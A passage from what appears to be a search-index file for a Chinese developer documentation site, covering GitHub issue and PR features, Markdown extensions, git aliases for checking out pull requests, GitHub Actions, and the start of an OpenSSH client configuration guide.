<p>\u200b\u4e4b\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u50cf\u200b\u666e\u901a\u200b\u7684\u200b\u4ed3\u5e93\u200b\u4e00\u6837\u200b\uff0c\u200b\u6b63\u5e38\u200b\u8fdb\u884c\u200b <code>git</code> \u200b\u64cd\u4f5c\u200b\u4e86\u200b\u3002</p>"},{"location":"dev/git/#github-issue","title":"Issue","text":"<p>\u200b\u4e0b\u9762\u200b\u5173\u4e8e\u200b Markdown \u200b\u7684\u200b\u7279\u6027\u200b\u5e76\u200b\u4e0d\u200b\u9650\u4e8e\u200b Issue\uff0c\u200b\u4e5f\u200b\u9002\u7528\u200b\u4e8e\u200b Pull Request \u200b\u7b49\u200b\u3002</p>"},{"location":"dev/git/#github-link","title":"GitHub \u200b\u94fe\u63a5","text":"<p>\u200b\u6211\u4eec\u200b\u4ee5\u200b ustclug/mirrorrequest#213 \u200b\u4e3a\u4f8b\u200b\uff1a</p> <ul> <li>\u200b\u5728\u200b Issue \u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>#</code> \u200b\u6765\u200b\u5f15\u7528\u200b\u5176\u4ed6\u200b Issue / PR\uff0c\u200b\u4f8b\u5982\u200b <code>#133</code></li> <li> <p>\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>user/repo#issue_number</code> \u200b\u7684\u200b\u65b9\u5f0f\u200b\u5f15\u7528\u200b\u5176\u4ed6\u200b\u4ed3\u5e93\u200b\u7684\u200b Issue / PR\uff0c\u200b\u4f8b\u5982\u200b <code>tuna/issues#341</code></p> <ul> <li> <p>\u200b\u5f53\u200b\u4e00\u4e2a\u200b PR \u200b\u5305\u542b\u200b\u5982\u4e0b\u200b\u5173\u952e\u5b57\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6309\u7167\u200b\u4e0a\u8ff0\u200b\u65b9\u6cd5\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e00\u4e2a\u200b Issue \u200b\u65f6\u200b\uff0c\u200b\u5408\u5e76\u200b\u8fd9\u4e2a\u200b PR \u200b\u4f1a\u200b\u5173\u95ed\u200b\u5bf9\u5e94\u200b\u7684\u200b issue\uff1a</p> <pre><code>close(s,d) #123\nfix(es, ed) #123\nresolve(s, d) #123\n</code></pre> </li> </ul> </li> <li> <p>\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b GitHub Web \u200b\u4e0a\u200b Copy permalink \u200b\u7684\u200b\u65b9\u5f0f\u200b\u83b7\u53d6\u200b\u4ee3\u7801\u200b\u7684\u200b\u94fe\u63a5\u200b\uff0c\u200b\u4f8b\u5982\u200b\u6253\u5f00\u200b ustclug/mirrorrequest/README.md \u200b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u67d0\u200b\u4e00\u884c\u200b\uff0c\u200b\u70b9\u51fb\u200b\u5de6\u4fa7\u200b\u7684\u200b\u83dc\u5355\u200b\uff0c\u200b\u9009\u62e9\u200b Copy permalink, \u200b\u5373\u53ef\u200b\u83b7\u5f97\u200b\u8bf8\u5982\u200b https://github.com/ustclug/mirrorrequest/blob/f23dd1f1cbe81f01e4f878ac11ee064b6c7d70ec/README.md?plain=1#L1 \u200b\u8fd9\u6837\u200b\u7684\u200b\u94fe\u63a5\u200b\u3002</p> <ul> <li>\u200b\u8fd9\u6837\u200b\u7684\u200b\u94fe\u63a5\u200b\u53ef\u4ee5\u200b\u5728\u200b Issue \u200b\u4e2d\u200b\u76f4\u63a5\u200b\u7c98\u8d34\u200b\uff0c\u200b\u4f1a\u200b\u88ab\u200b\u4ee5\u200b\u4ee3\u7801\u200b\u6846\u200b\u7684\u200b\u5f62\u5f0f\u200b\u6e32\u67d3\u200b\u5230\u200b Issue \u200b\u4e2d\u200b\uff0c\u200b\u65b9\u4fbf\u200b\u5176\u4ed6\u4eba\u200b\u8fc5\u901f\u200b\u4e86\u89e3\u200b\u95ee\u9898\u200b\u3002</li> <li>\u200b\u70b9\u51fb\u200b\u540e\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u590d\u5236\u200b\u5730\u5740\u680f\u200b\u4e2d\u200b\u7684\u200b URL\uff0c\u200b\u8fd9\u6837\u200b\u7684\u200b\u94fe\u63a5\u200b\u603b\u662f\u200b\u6307\u5411\u200b\u67d0\u4e2a\u200b branch \u200b\u6216\u8005\u200b tag \u200b\u7684\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u7279\u5b9a\u200b commit\uff0c\u200b\u4f46\u200b\u8fd9\u6837\u200b\u7684\u200b\u4f5c\u6cd5\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u94fe\u63a5\u200b\u5931\u6548\u200b\u3002</li> </ul> </li> </ul>"},{"location":"dev/git/#github-gfm","title":"GitHub Flavor Markdown","text":"<p>\u200b\u6b63\u5982\u200b\u5176\u4ed6\u200b\u7f16\u8f91\u5668\u200b\u5bf9\u200b Markdown \u200b\u7684\u200b\u652f\u6301\u200b\u4e00\u6837\u200b\uff0cGitHub \u200b\u652f\u6301\u200b\u4e00\u4e2a\u200b Markdown \u200b\u65b9\u8a00\u200b\uff08\u200b\u8d85\u96c6\u200b\uff09\u200b\u7684\u200b\u5199\u6cd5\u200b\uff0c\u200b\u79f0\u4e3a\u200b GitHub Flavor Markdown\u3002</p> <p>\u200b\u6211\u4eec\u200b\u5728\u200b\u8fd9\u91cc\u200b\u4ecb\u7ecd\u200b\u4e00\u4e9b\u200b\u4f60\u200b\u53ef\u80fd\u200b\u611f\u5174\u8da3\u200b\u7684\u200b feature\uff1a</p> <ul> <li> <p>Mermaid \u200b\u5173\u7cfb\u200b\u56fe\u200b</p> <p>Mermaid \u200b\u662f\u200b\u4e00\u79cd\u200b\u7b80\u5355\u200b\u4e14\u200b\u5f3a\u5927\u200b\u7684\u200b\u5173\u7cfb\u200b\u56fe\u200b/\u200b\u6d41\u7a0b\u56fe\u200b\u8bed\u6cd5\u200b\uff0c\u200b\u4f8b\u5982\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5982\u4e0b\u200b\u65b9\u5f0f\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u5173\u7cfb\u200b\u56fe\u200b\uff1a</p> <pre><code>```mermaid\ngraph LR;\n    A--&gt;B;\n    A--&gt;C;\n    B--&gt;D;\n    C--&gt;D;\n```\n</code></pre> <pre><code>graph LR;\n    A--&gt;B;\n    A--&gt;C;\n    B--&gt;D;\n    C--&gt;D;</code></pre> </li> <li> <p>MathJax \u200b\u652f\u6301\u200b</p> <p>GitHub \u200b\u901a\u8fc7\u200b MathJax \u200b\u652f\u6301\u200b LaTeX \u200b\u516c\u5f0f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>$ \\frac 12 $</code> \u200b\u7684\u200b\u5f62\u5f0f\u200b\u521b\u5efa\u200b\u884c\u5185\u200b\u516c\u5f0f\u200b\uff0c <code>$$ \\frac 12 $$</code> \u200b\u7684\u200b\u5f62\u5f0f\u200b\u521b\u5efa\u200b\u5757\u7ea7\u200b\u516c\u5f0f\u200b\u3002</p> </li> <li> <p>\u200b\u8fdb\u5ea6\u200b\u8ddf\u8e2a\u200b</p> <p>\u200b\u5728\u200b Issue \u200b\u6b63\u6587\u200b\u4e2d\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u4efb\u52a1\u200b\u5217\u8868\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>- [x] Task 1 #123\n- [ ] Task 2\n</code></pre> <ul> <li> Task 1 #123</li> <li> Task 2</li> </ul> <p>\u200b\u6b64\u65f6\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u8fd9\u4e2a\u200b Issue \u200b\u8f6c\u5316\u200b\u4e3a\u200b\u4e00\u4e2a\u200b\u4efb\u52a1\u200b\u5217\u8868\u200b\uff0c\u200b\u65b9\u4fbf\u200b\u8ffd\u8e2a\u200b\u4efb\u52a1\u200b\u7684\u200b\u8fdb\u5ea6\u200b\uff0c\u200b\u540c\u65f6\u200b <code>#123</code> \u200b\u4f1a\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e3a\u200b <code>Tracked by #xxx</code>\u3002</p> </li> </ul>"},{"location":"dev/git/#github-issue-template","title":"Issue \u200b\u6a21\u677f","text":"<p>\u200b\u5bf9\u4e8e\u200b\u5927\u578b\u9879\u76ee\u200b\uff0c\u200b\u4f7f\u7528\u200b Issue template \u200b\u53ef\u4ee5\u200b\u4f7f\u5f97\u200b Issue \u200b\u66f4\u52a0\u200b\u89c4\u8303\u5316\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>.github/ISSUE_TEMPLATE/bug_report.yml</code> \u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u5982\u4e0b\u200b\u5185\u5bb9\u200b\uff1a</p> <pre><code>name: Bug Report\nabout: Create a report to help us improve\nlabels:\n  - bug\nbody:\n  - type: textarea\n    id: bug-description\n    attributes:\n      label: Describe the bug\n      description: A clear and concise description of what the bug is.\n      placeholder: I'm always frustrated when...\n    validations:\n      required: true\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b ustclug/mirrorrequest/.../01-mirror-request.yml, GitHub \u200b\u6587\u6863\u200b.</p>"},{"location":"dev/git/#github-pr","title":"Pull Request","text":"<p>\u200b\u5bf9\u4e8e\u200b\u7ef4\u62a4\u8005\u200b\uff08Maintainer\uff09\u200b\u6765\u8bf4\u200b\uff0cPull Request \u200b\u66f4\u200b\u50cf\u662f\u200b Merge Request, \u200b\u4ed6\u4eec\u200b\u4f1a\u200b\u68c0\u67e5\u200b\u4ee3\u7801\u200b\u3001\u200b\u6d4b\u8bd5\u4ee3\u7801\u200b\u3001review \u200b\u4ee3\u7801\u200b\uff0c\u200b\u7136\u540e\u200b\u5c06\u200b\u4ee3\u7801\u200b\u5408\u5e76\u200b\u5230\u200b\u4e3b\u200b\u5206\u652f\u200b\u4e2d\u200b\u3002</p> <p>GitHub \u200b\u5728\u200b \u200b\u8fd9\u91cc\u200b \u200b\u4ecb\u7ecd\u200b\u4e86\u200b\u5408\u5e76\u200b PR \u200b\u7684\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u7b80\u5355\u200b\u6765\u8bf4\u200b\u8ddf\u200b\u672c\u5730\u200b merge / rebase \u200b\u6ca1\u6709\u200b\u592a\u200b\u5927\u200b\u533a\u522b\u200b\u3002</p> <ul> <li>PR \u200b\u4e2d\u4ec5\u200b\u6709\u200b\u4e00\u4e2a\u200b commit \u200b\u65f6\u200b\uff0c\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b Rebase \u200b\u5408\u5e76\u200b PR</li> <li>\u200b\u5f53\u200b PR \u200b\u4e2d\u200b\u5305\u542b\u200b\u591a\u6b21\u200b commit\uff0c\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b\u5e94\u5f53\u200b\u5408\u5e76\u200b\u4e3a\u200b\u4e00\u4e2a\u200b\u65f6\u200b\uff08\u200b\u4f8b\u5982\u200b\u7ecf\u8fc7\u200b Review \u200b\u540e\u200b\uff09\uff0c\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b Squash \u200b\u5408\u5e76\u200b PR</li> <li>\u200b\u591a\u6b21\u200b commit \u200b\u6765\u200b\u63d0\u4ea4\u200b\u65b0\u200b feature \u200b\u65f6\u200b\uff0c\u200b\u63a8\u8350\u200b\u4f7f\u7528\u200b Merge \u200b\u5408\u5e76\u200b PR</li> </ul> <p>\u200b\u7ef4\u62a4\u8005\u200b\u6709\u65f6\u200b\u4f1a\u200b\u9700\u8981\u200b\u5c06\u200b PR checkout \u200b\u5230\u200b\u672c\u5730\u200b\u4ee5\u200b\u6d4b\u8bd5\u200b\uff1a</p> <ul> <li> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b GitHub CLI \u200b\u7684\u200b <code>gh pr checkout</code> \u200b\u547d\u4ee4\u200b\u5feb\u901f\u200b\u5b8c\u6210\u200b</p> </li> <li> <p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u91c7\u7528\u200b\u624b\u5de5\u200b\u65b9\u5f0f\u200b\uff1a</p> <ul> <li>\u200b\u4f7f\u7528\u200b <code>git fetch origin pull/1234/head:pr-1234</code> \u200b\u7684\u200b\u5f62\u5f0f\u200b\u5c06\u200b\u7f16\u53f7\u200b\u4e3a\u200b 1234 \u200b\u7684\u200b PR \u200b\u5bf9\u5e94\u200b\u7684\u200b HEAD \u200b\u540c\u6b65\u200b\u5230\u200b\u672c\u5730\u200b\u7684\u200b <code>pr-1234</code> \u200b\u5206\u652f\u200b</li> <li>\u200b\u4e4b\u540e\u200b <code>git checkout pr-1234</code> \u200b\u5373\u53ef\u200b</li> </ul> </li> </ul> <p>\u200b\u53ea\u8bfb\u200b\u5206\u652f\u200b</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fdc\u7a0b\u200b\u7684\u200b <code>pull/&lt;id&gt;/head</code> \u200b\u662f\u200b\u53ea\u8bfb\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5199\u5165\u200b\u5176\u4ed6\u4eba\u200b\u7684\u200b PR \u200b\u5206\u652f\u200b\uff0c\u200b\u9700\u8981\u200b\u81ea\u884c\u200b <code>git remote add</code> \u200b\u6dfb\u52a0\u200b\u5bf9\u65b9\u200b\u7684\u200b\u4ed3\u5e93\u200b\uff0c\u200b\u5e76\u200b\u5c06\u200b\u5176\u200b PR \u200b\u5bf9\u5e94\u200b\u7684\u200b\u5206\u652f\u200b\u6dfb\u52a0\u200b\u5230\u200b\u672c\u5730\u200b\u3002</p> <p>\u200b\u7ef4\u62a4\u8005\u200b\u53ef\u4ee5\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u65b0\u200b\u5206\u652f\u200b\u4e2d\u200b\u540c\u6b65\u200b\u8d21\u732e\u8005\u200b\u7684\u200b\u65b0\u200b\u4fee\u6539\u200b\uff0c\u200b\u5982\u679c\u200b PR \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b \"Allow edits from maintainers\"\uff0c\u200b\u90a3\u4e48\u200b\u7ef4\u62a4\u8005\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u5199\u5165\u200b\u8d21\u732e\u8005\u200b\u7684\u200b PR\u3002</p> <p>GitLab</p> <p>GitLab \u200b\u7684\u200b Merge Request \u200b\u6574\u4f53\u200b\u4e0a\u200b\u4e0e\u200b GitHub \u200b\u7684\u200b Pull Request \u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u4e0d\u8fc7\u200b checkout \u200b\u5230\u200b\u672c\u5730\u200b\u7684\u200b\u64cd\u4f5c\u200b\u6709\u6240\u4e0d\u540c\u200b\u3002\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b GitLab \u200b\u63d0\u4f9b\u200b\u7684\u200b\u547d\u4ee4\u884c\u200b\u5de5\u5177\u200b glab\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>git fetch origin merge-requests/1234/head:mr-1234</code> \u200b\u7684\u200b\u65b9\u5f0f\u200b\u5c06\u200b\u7f16\u53f7\u200b\u4e3a\u200b 1234 \u200b\u7684\u200b MR \u200b\u5bf9\u5e94\u200b\u7684\u200b HEAD \u200b\u540c\u6b65\u200b\u5230\u200b\u672c\u5730\u200b\u7684\u200b <code>mr-1234</code> \u200b\u5206\u652f\u200b\u3002</p> <p>\u200b\u4ee5\u4e0a\u200b\u5185\u5bb9\u200b\u4e5f\u200b\u9002\u7528\u200b\u4e8e\u200b\u81ea\u200b\u6258\u7ba1\u200b\u7684\u200b GitLab \u200b\u5b9e\u4f8b\u200b\u3002</p> <p>\u200b\u4fbf\u4e8e\u200b\u540c\u6b65\u200b PR/MR \u200b\u7684\u200b\u53c2\u8003\u200b alias</p> ~/.gitconfig<pre><code>[alias]\n    pr = !sh -c 'git fetch -u $1 +pull/$2/head:pr-$1-$2 &amp;&amp; git checkout pr-$1-$2 &amp;&amp; git reset --hard HEAD' -\n    mr = !sh -c 'git fetch -u $1 +merge-requests/$2/head:mr-$1-$2 &amp;&amp; git checkout mr-$1-$2 &amp;&amp; git reset --hard HEAD' -\n</code></pre> <p>\u200b\u4f7f\u7528\u200b\u4f8b\u5b50\u200b\uff1a<code>git pr origin 1234</code>\uff08GitHub\uff09\u3001<code>git mr origin 1234</code>\uff08GitLab\uff09\u3002\u200b\u91cd\u590d\u200b\u6267\u884c\u200b\u53ef\u200b\u4ece\u200b PR/MR \u200b\u4e2d\u200b\u83b7\u53d6\u200b\u6700\u65b0\u200b\u7684\u200b\u4fee\u6539\u200b\u3002</p> <p><code>git pull</code>?</p> <p>\u200b\u4e3a\u4ec0\u4e48\u200b\u8fd9\u6837\u200b\u5f97\u5230\u200b\u7684\u200b\u5206\u652f\u200b\u65e0\u6cd5\u200b\u6267\u884c\u200b <code>git pull</code>\uff1f\u200b\u5982\u4f55\u200b\u4fee\u590d\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff1f</p> <p>\u200b\u4ee5\u4e0a\u200b\u4fee\u6539\u200b\u81ea\u200b Check out locally by adding a Git alias\u3002</p> <p>\u200b\u53c2\u6570\u200b\u8bf4\u660e\u200b</p> <p>\u200b\u539f\u59cb\u200b\u7684\u200b alias \u200b\u5982\u4e0b\u200b\uff1a</p> ~/.gitconfig<pre><code>[alias]\n    pr = !sh -c 'git fetch $1 pull/$2/head:pr-$1-$2 &amp;&amp; git checkout pr-$1-$2' -\n    mr = !sh -c 'git fetch $1 merge-requests/$2/head:mr-$1-$2 &amp;&amp; git checkout mr-$1-$2' -\n</code></pre> <p>\u200b\u76f8\u6bd4\u200b\u539f\u59cb\u200b\u7684\u200b alias\uff0c\u200b\u8fd9\u91cc\u200b\u7684\u200b\u6709\u200b\u4ec0\u4e48\u200b\u53d8\u5316\u200b\uff1f\u200b\u6dfb\u52a0\u200b\u8fd9\u4e9b\u200b\u53d8\u5316\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u4ec0\u4e48\u200b\uff1f\u200b\u662f\u5426\u200b\u6709\u200b\u66f4\u597d\u200b\u7684\u200b\u89e3\u51b3\u65b9\u6848\u200b\uff1f</p>"},{"location":"dev/git/#github-actions","title":"GitHub Actions","text":"<p>GitHub Actions \u200b\u662f\u200b GitHub \u200b\u63d0\u4f9b\u200b\u7684\u200b CI/CD \u200b\u670d\u52a1\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u81ea\u52a8\u5316\u200b\u6784\u5efa\u200b\u3001\u200b\u6d4b\u8bd5\u200b\u3001\u200b\u90e8\u7f72\u200b\u7b49\u200b\u3002</p> <p>GitHub Actions Pricing</p> <p>\u200b\u5bf9\u4e8e\u200b Public \u200b\u4ed3\u5e93\u200b\uff0cGitHub \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u514d\u8d39\u200b\u7684\u200b\u670d\u52a1\u200b\uff0c\u200b\u5bf9\u4e8e\u200b Private \u200b\u4ed3\u5e93\u200b\uff0cGitHub \u200b\u63d0\u4f9b\u200b\u4e86\u200b 2000 \u200b\u5206\u949f\u200b\u7684\u200b\u514d\u8d39\u200b\u670d\u52a1\u200b\u3002</p> <p>\u200b\u5173\u4e8e\u200b\u8ba1\u8d39\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\u8fd9\u91cc\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b GitHub Actions \u200b\u7684\u200b\u5199\u6cd5\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u5173\u5fc3\u200b\u5982\u4e0b\u200b\u51e0\u4ef6\u200b\u4e8b\u60c5\u200b\uff1a</p> <ul> <li>\u200b\u4f55\u65f6\u200b\u5e94\u5f53\u200b\u89e6\u53d1\u200b Action\uff1a\u200b\u4f8b\u5982\u200b <code>on: push, pull_request</code></li> <li>\u200b\u5982\u4f55\u200b\u5728\u200b GitHub Actions \u200b\u4e0a\u200b\u642d\u5efa\u200b\u73af\u5883\u200b\uff08\u200b\u4f8b\u5982\u200b\u5b89\u88c5\u200b\u4f9d\u8d56\u200b\u3001\u200b\u914d\u7f6e\u200b\u73af\u5883\u53d8\u91cf\u200b\u7b49\u200b\uff09</li> <li>\u200b\u4ea7\u7269\u200b\u7684\u200b\u5b58\u653e\u200b\u4f4d\u7f6e\u200b\uff1a\u200b\u4f8b\u5982\u200b <code>artifacts</code>\u3001<code>release</code></li> </ul> <p>\u200b\u5982\u679c\u200b\u6d89\u53ca\u200b\u5230\u200b Secret Key\uff0c\u200b\u8fd8\u200b\u5e94\u5f53\u200b\u6ce8\u610f\u5b89\u5168\u200b\u95ee\u9898\u200b\uff08\u200b\u9650\u5236\u200b\u89e6\u53d1\u200b\u6761\u4ef6\u200b\u3001\u200b\u4ea7\u7269\u200b\u7b49\u200b\uff09\u3002</p> <p>GitHub \u200b\u5728\u200b \u200b\u8fd9\u91cc\u200b \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u8be6\u7ec6\u200b\u7684\u200b\u6587\u6863\u200b\u3002</p> <p>\u200b\u672c\u5730\u200b\u8fd0\u884c\u200b GitHub Actions</p> <p>\u200b\u6d4b\u8bd5\u200b CI \u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u662f\u200b\u4ef6\u200b\u5934\u75bc\u200b\u7684\u200b\u4e8b\u60c5\u200b\uff1a\u200b\u8981\u200b\u4e00\u904d\u200b\u53c8\u200b\u4e00\u904d\u200b commit\u3001push\u3001\u200b\u89c2\u5bdf\u200b\u662f\u5426\u200b\u8fd0\u884c\u200b\u6b63\u786e\u200b\uff0c\u200b\u51e0\u4e4e\u200b\u662f\u200b\u4e00\u79cd\u200b\u65e0\u5c3d\u200b\u7684\u200b\u6298\u78e8\u200b\u2014\u2014\u200b\u5982\u679c\u200b\u80fd\u200b\u5728\u200b\u672c\u5730\u200b\u8fd0\u884c\u200b\u6307\u5b9a\u200b\u7684\u200b workflow \u200b\u5c31\u200b\u597d\u200b\u4e86\u200b\uff01\u200b\u5bf9\u4e8e\u200b GitHub Actions\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b act \u200b\u5de5\u5177\u200b\uff0c\u200b\u5176\u4f1a\u200b\u8c03\u7528\u200b Docker \u200b\u8fd0\u884c\u200b\u6a21\u62df\u200b Actions \u200b\u7684\u200b\u73af\u5883\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u672c\u5730\u200b\u5feb\u901f\u200b\u6d4b\u8bd5\u200b\u3002</p>"},{"location":"dev/git/#ci-cd","title":"Other CI/CD systems","text":"<p>\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e9b\u200b\u5176\u4ed6\u200b\u5e38\u7528\u200b\u7684\u200b CI/CD \u200b\u63d0\u4f9b\u5546\u200b\uff0c\u200b\u5b83\u4eec\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u670d\u52a1\u200b\uff1a</p> <ul> <li>Travis CI</li> <li>Circle CI</li> <li>GitLab CI</li> <li>Jenkins</li> <li>Azure Pipelines</li> </ul> <p>\u200b\u8003\u8651\u200b\u5230\u200b GitHub Actions \u200b\u7684\u200b\u514d\u8d39\u200b\u989d\u5ea6\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u4e0e\u200b GitHub \u200b\u7684\u200b\u65e0\u7f1d\u200b\u96c6\u6210\u200b\u7b49\u200b\uff0c\u200b\u5df2\u7ecf\u200b\u8db3\u591f\u200b\u6ee1\u8db3\u200b\u5927\u591a\u6570\u200b\u9879\u76ee\u200b\u7684\u200b\u9700\u6c42\u200b\uff0c\u200b\u56e0\u6b64\u200b\u6211\u4eec\u200b\u5728\u200b\u8fd9\u91cc\u200b\u4e0d\u518d\u200b\u8be6\u7ec6\u200b\u4ecb\u7ecd\u200b\u5176\u4ed6\u200b CI/CD \u200b\u7cfb\u7edf\u200b\u3002</p>"},{"location":"dev/ssh/","title":"SSH \u200b\u4f7f\u7528\u200b\u6280\u5de7","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@iBug\u3001@taoky</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u5c3d\u7ba1\u200b SSH \u200b\u662f\u200b\u4e00\u79cd\u200b\u5f00\u653e\u200b\u534f\u8bae\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u4e3b\u6d41\u200b\u5b9e\u73b0\u200b OpenSSH \u200b\u5177\u6709\u200b\u6700\u200b\u4e30\u5bcc\u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u7edd\u5927\u591a\u6570\u200b Linux \u200b\u53d1\u884c\u7248\u200b\u91c7\u7528\u200b\u7684\u200b\u9ed8\u8ba4\u200b SSH \u200b\u65b9\u6848\u200b\uff0c\u200b\u56e0\u6b64\u200b\u672c\u200b\u6559\u7a0b\u200b\u4e3b\u8981\u200b\u4ecb\u7ecd\u200b OpenSSH \u200b\u7684\u200b\u4f7f\u7528\u200b\u3002</p>"},{"location":"dev/ssh/#ssh-config","title":"\u5ba2\u6237\u7aef\u200b\u914d\u7f6e","text":"<p>SSH \u200b\u5ba2\u6237\u7aef\u200b\u4f1a\u200b\u6309\u200b\u987a\u5e8f\u200b\u5904\u7406\u200b\u4ee5\u4e0b\u200b\u914d\u7f6e\u200b\uff0c\u200b\u5148\u200b\u51fa\u73b0\u200b\u7684\u200b\u914d\u7f6e\u200b\u4f18\u5148\u7ea7\u200b\u66f4\u9ad8\u200b\uff1a</p> <ul> <li>\u200b\u547d\u4ee4\u884c\u200b\u53c2\u6570\u200b</li> <li><code>~/.ssh/config</code></li> <li><code>/etc/ssh/ssh_config</code></li> </ul> <p>OpenSSH \u200b\u7684\u200b\u6240\u6709\u200b\u914d\u7f6e\u200b\u9879\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u5728\u200b ssh_config(5) \u200b\u4e2d\u200b\u627e\u5230\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4ecb\u7ecd\u200b\u4e00\u4e9b\u200b\u5e38\u7528\u200b\u7684\u200b\u914d\u7f6e\u200b\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u7ecf\u5e38\u200b\u767b\u5f55\u200b\u7684\u200b\u4e3b\u673a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>~/.ssh/config</code> \u200b\u4e2d\u200b\u914d\u7f6e\u200b\u4e3b\u673a\u200b\u522b\u540d\u200b\u3001\u200b\u7528\u6237\u540d\u200b\u3001\u200b\u7aef\u53e3\u200b\u7b49\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4ee5\u200b\u7b80\u5316\u200b\u767b\u5f55\u200b\u547d\u4ee4\u200b\u3002</p> <pre><code>Host example\n  Hostname example.com\n  User sshuser\n  Port 22\n</code></pre> <p>\u200b\u6ce8\u610f\u200b SSH config \u200b\u6ca1\u6709\u200b\u63d0\u4f9b\u200b\u5bc6\u7801\u200b\u914d\u7f6e\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5c06\u200b\u5bc6\u7801\u200b\u5b58\u50a8\u200b\u5728\u200b\u660e\u6587\u200b\u6587\u4ef6\u200b\u4e2d\u662f\u200b\u4e0d\u200b\u5b89\u5168\u200b\u7684\u200b\u505a\u6cd5\u200b\uff0c\u200b\u8bf7\u200b\u4f7f\u7528\u200b\u5bc6\u94a5\u200b\u767b\u5f55\u200b\u3002</p>"},{"location":"dev/ssh/#public-key-authentication","title":"\u516c\u94a5\u200b\u8ba4\u8bc1","text":"<p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cSSH \u200b\u4f1a\u200b\u5bfb\u627e\u200b <code>~/.ssh/id_*</code> \u200b\u4f5c\u4e3a\u200b\u79c1\u94a5\u200b\uff0c\u200b\u5176\u4e2d\u200b <code>*</code> \u200b\u90e8\u5206\u200b\u53ef\u4ee5\u200b\u662f\u200b <code>rsa</code>\u3001<code>ecdsa</code>\u3001<code>ed25519</code> \u200b\u7b49\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>-i</code> \u200b\u53c2\u6570\u200b\u6307\u5b9a\u200b\u79c1\u94a5\u200b\u6587\u4ef6\u200b\u3002\u200b\u79c1\u94a5\u200b\u7684\u200b\u6587\u4ef6\u540d\u200b\u52a0\u4e0a\u200b <code>.pub</code> \u200b\u540e\u7f00\u200b\u5c31\u662f\u200b\u516c\u94a5\u200b\u6587\u4ef6\u200b\uff0c\u200b\u6682\u65f6\u200b\u6ca1\u6709\u200b\u65b9\u6cd5\u200b\u6307\u5b9a\u200b\u516c\u94a5\u200b\u6587\u4ef6\u200b\u7684\u200b\u8def\u5f84\u200b\u3002\u200b\u5982\u679c\u200b\u8981\u200b\u5728\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e2d\u200b\u6307\u5b9a\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b\u79c1\u94a5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>IdentityFile</code> 